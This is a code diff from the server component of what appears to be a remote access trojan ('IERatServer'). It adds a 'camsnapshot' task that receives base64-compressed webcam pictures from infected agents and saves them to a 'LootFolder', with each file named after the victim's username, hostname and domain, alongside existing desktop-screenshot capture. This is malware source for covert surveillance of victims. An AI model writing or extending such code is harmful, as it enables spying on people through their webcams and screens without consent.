@@ -13,11 +13,19 @@ namespace IERatServer.lib
                 var agent = ActiveChannel.agent;
                 string Filename = "";
                 if (taskObject.args == "")  {
-                    Filename = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}.jpg";
+                    if (taskObject.Type == "camsnapshot")
+                    {
+                        Filename = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}-webcam-capture.jpg";
+                    }
+                    else
+                    {
+                        Filename = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}-desktop-screenshot.jpg";
+                    }
                 }
                 else {
                     Filename = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}-{taskObject.args}";
                 }
+
                 var filepath = Path.Combine(CLI.LootFolder, Filename);
                 var destinationFile = File.Create(filepath);
                 var fileBytes = ServerUtils.Decompress(Convert.FromBase64String(taskObject.Result));
@@ -36,6 +44,12 @@ namespace IERatServer.lib
                     CLI.ScreenMessage($"Screenshot saved successfully to {filepath}");
                     Logger.Log("info", $"Screenshot was successfull saved from agent {requestobject.AgentID} to file {filepath}");
                     taskObject.Result = "Screenshot saved successfully";
+                }
+                if (taskObject.Type == "camsnapshot")
+                {
+                    CLI.ScreenMessage($"Webcam picture saved successfully to {filepath}");
+                    Logger.Log("info", $"Webcam picture was successfull saved from agent {requestobject.AgentID} to file {filepath}");
+                    taskObject.Result = "Webcam picture saved successfully";
                 }
                 Console.ForegroundColor = ConsoleColor.White;
 
